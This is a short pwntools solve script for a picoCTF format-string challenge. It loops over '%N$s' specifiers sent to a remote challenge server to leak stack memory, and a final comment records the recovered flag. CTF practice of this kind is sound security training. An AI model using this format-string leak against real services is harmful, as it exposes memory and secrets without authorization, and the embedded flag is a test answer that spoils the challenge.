from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *main
continue
'''.format(**locals())

exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
# p = start()
# p.sendlineafter(b">> ", b"%20$s")
# p.interactive()

context.log_level = 'error'
for i in range(30):
    try:
        r = remote("saturn.picoctf.net", 57645)
        r.sendlineafter(b">> ", f"%{i}$s".encode())
        r.recvline()
        print(r.recvline(), i)
    except:
        pass


# picoCTF{L34k1ng_Fl4g_0ff_St4ck_6aea3c7c}